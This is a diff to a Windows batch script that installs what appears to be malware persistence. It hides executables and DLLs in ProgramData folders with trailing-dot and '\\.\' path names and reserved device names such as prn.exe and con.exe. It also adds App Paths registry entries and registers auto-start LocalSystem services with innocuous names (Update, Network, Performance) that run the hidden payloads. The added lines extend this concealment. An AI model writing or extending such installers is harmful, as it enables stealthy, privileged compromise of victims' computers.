@@ -58,9 +58,11 @@ mkdir \\.\%ProgramData%\diaglogs..\
 mkdir %WINDIR%\Setup\Scripts
 
 copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\logdata..\"
+copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\logdata..\prn.exe"
 move /Y "%ProgramData%\Comms\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
-move /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\"
+copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\"
+move /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\con.exe"
 move /Y "%ProgramData%\Comms\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
 
 move /Y "%ProgramData%\Comms\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
@@ -82,10 +84,10 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
-sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+sc create Update binPath="\\.\%ProgramData%\logdata..\prn.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
 
 sc create Configuration binPath="%WINDIR%\System32\cmd.exe /c start info.exe" start="auto" obj="LocalSystem"
-sc create Network binPath="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini" start="auto" obj="LocalSystem"
+sc create Network binPath="\\.\%ProgramData%\diaglogs..\con.exe \\.\%ProgramData%\diaglogs..\con.ini" start="auto" obj="LocalSystem"
 sc config Configuration start= delayed-auto
 sc config Network start= delayed-auto
 
